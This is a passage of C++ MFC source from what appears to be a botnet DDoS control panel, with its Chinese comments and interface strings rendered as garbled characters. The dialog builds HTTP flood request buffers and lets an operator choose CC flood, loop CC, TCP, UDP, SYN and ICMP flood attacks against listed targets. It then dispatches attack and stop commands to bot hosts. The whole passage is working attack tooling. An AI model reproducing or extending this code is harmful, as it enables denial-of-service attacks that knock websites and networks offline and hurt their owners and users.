		_T("\r\n")
		_T("\r\n");
	
	CString W;
	CStringA A;
	TCHAR SendData[2000]; //���͵����ݰ�
	wsprintf(SendData, SendBuffer, Page, CreateRandNum(5, 9), CreateRandNum(2, 6), DNS);
	W = SendData;
	A = W;
	memcpy(m_Attack.SendData, A.GetBuffer(), A.GetLength() * sizeof(TCHAR));
	m_Attack.AttackPort = iPort;


	return TRUE;
}

void CWebAttackDlg::OnStart()
{
	// TODO: Add your command handler code here
	for (int i = 0; i < m_TargetList.GetItemCount(); i++)
	{
		if (LVIS_SELECTED == m_TargetList.GetItemState(i, LVIS_SELECTED))
		{
			CString str = m_TargetList.GetItemText(i, 8);
			if (str == _T("������"))
			{
				MessageBox(_T("���� Ŀ���Ѿ�������!"), _T("��ʾ"), MB_OK | MB_ICONINFORMATION);
				return;
			}
			else
			{
				//��ȡ�����ṹ��...
				ATTACK m_Attack;
				ZeroMemory(&m_Attack, sizeof(ATTACK));
				//��ȡĿ��
				m_TargetList.GetItemText(i, 0, m_Attack.Target, sizeof(m_Attack.Target));

				TCHAR Param[100] = { NULL };
				//��ȡ�˿�
				m_TargetList.GetItemText(i, 1, Param, 100);
				m_Attack.AttackPort = _tstoi(Param);

				//��ȡ�߳���
				m_TargetList.GetItemText(i, 3, Param, 100);
				m_Attack.AttackThread = _tstoi(Param);

				//��ȡʱ��
				m_TargetList.GetItemText(i, 4, Param, 100);
				m_Attack.AttackTime = _tstoi(Param);

				//��������..
				CString szType;
				szType = m_TargetList.GetItemText(i, 5);

				if (szType == _T("��վ: ����CC"))
				{
					m_Attack.AttackType = ATTACK_CCFLOOD;
					//����HTTP�����..
					FilterCCString(m_Attack.Target, m_Attack, m_Attack.AttackPort);
				}
				if (szType == _T("��վ: ģ�� IE"))
					m_Attack.AttackType = ATTACK_IMITATEIE;

				if (szType == _T("��վ: �ֻ�CC"))
				{
					m_Attack.AttackType = ATTACK_LOOPCC;
					FilterCCString(m_Attack.Target, m_Attack, m_Attack.AttackPort);

					//�ֽ����...
					m_TargetList.GetItemText(i, 6, Param, 100);

					TCHAR* Point = _tcsstr(Param, _T("-"));
					TCHAR temp[10] = { NULL };
					_tcsnccpy_s(temp, Param, lstrlen(Param) - lstrlen(Point));
					Point++;

					m_Attack.ExtendData1 = _tstoi(temp);
					m_Attack.ExtendData2 = _tstoi(Point);

				}
				if (szType == _T("����: TCP FLOOD"))
					m_Attack.AttackType = ATTACK_TCPFLOOD;
				if (szType == _T("����: UDP FLOOD"))
					m_Attack.AttackType = ATTACK_UDPFLOOD;
				if (szType == _T("������: SYN FLOOD"))
					m_Attack.AttackType = ATTACK_SYNFLOOD;
				if (szType == _T("������: ICMP FLOOD"))
					m_Attack.AttackType = ATTACK_ICMPFLOOD;
				if (szType == _T("����: ����ģʽ"))
					m_Attack.AttackType = ATTACK_BRAINPOWER;

				//��ȡ��������..
				CString szHost = m_TargetList.GetItemText(i, 2);
				INT HostNums = -1;
				if (szHost != _T("ѡ������"))
					HostNums = _tstoi(szHost.GetBuffer(0));


				//��ȡ����ID
				WORD Task = 0;
				CString  szTask = m_TargetList.GetItemText(i, 8);
				Task = _tstoi(szTask.GetBuffer(0));

				if (Point == NULL)
				{
					MessageBox(_T("��ʼ��ʧ�� ���������!"));
					return;
				}

				CDDOSAttackDlg* m_Point = (CDDOSAttackDlg*)Point;
				WORD Ret = m_Point->SendDDosAttackCommand(&m_Attack, HostNums, Task);

				CDDOSAttackDlg* m_AttackPoint = (CDDOSAttackDlg*)Point;
				CString szShow;
				szShow.Format(_T("�ɹ����� %d ����ʼ���� ����ID:%d"), Ret, Task);
				m_AttackPoint->StatusTextOut(0, szShow);

				m_TargetList.SetItemText(i, 7, _T("������"));
			}
		}
	}
}

void CWebAttackDlg::OnStop()
{
	// TODO: Add your command handler code here
	for (int i = 0; i < m_TargetList.GetItemCount(); i++)
	{
		if (LVIS_SELECTED == m_TargetList.GetItemState(i, LVIS_SELECTED))
		{
			CString str = m_TargetList.GetItemText(i, 7);
			if (str == _T("����"))
			{
				MessageBox(_T("���� Ŀ�겢δ��ʼ �޷�ֹͣ!"), _T("��ʾ"), MB_OK | MB_ICONINFORMATION);
				return;
			}
			else
			{
				CDDOSAttackDlg* m_Point = (CDDOSAttackDlg*)Point;

				//��ȡ����ID
				WORD Task = 0;
				CString  szTask = m_TargetList.GetItemText(i, 8);
				Task = _tstoi(szTask.GetBuffer(0));

				WORD Ret = m_Point->SendDDostStopCommand(Task);


				CDDOSAttackDlg* m_AttackPoint = (CDDOSAttackDlg*)Point;
				CString szShow;
				szShow.Format(_T("�ɹ����� %d ��ֹͣ���� ����ID:%d"), Ret, Task);
				m_AttackPoint->StatusTextOut(0, szShow);

				m_TargetList.SetItemText(i, 7, _T("����"));
			}
		}

	}
}



void CWebAttackDlg::OnDeleteList()
{
	// TODO: Add your command handler code here
	for (int i = 0; i < m_TargetList.GetItemCount(); i++)
	{
		if (LVIS_SELECTED == m_TargetList.GetItemState(i, LVIS_SELECTED))
		{
			CString str = m_TargetList.GetItemText(i, 7);
			if (str == _T("������"))
			{
				MessageBox(_T("���� Ŀ���Ѿ�������! �޷�ɾ��!����ֹͣ��ɾ��!"), _T("��ʾ"), MB_OK | MB_ICONINFORMATION);
				return;
			}
			m_TargetList.DeleteItem(i);
		}
	}
}
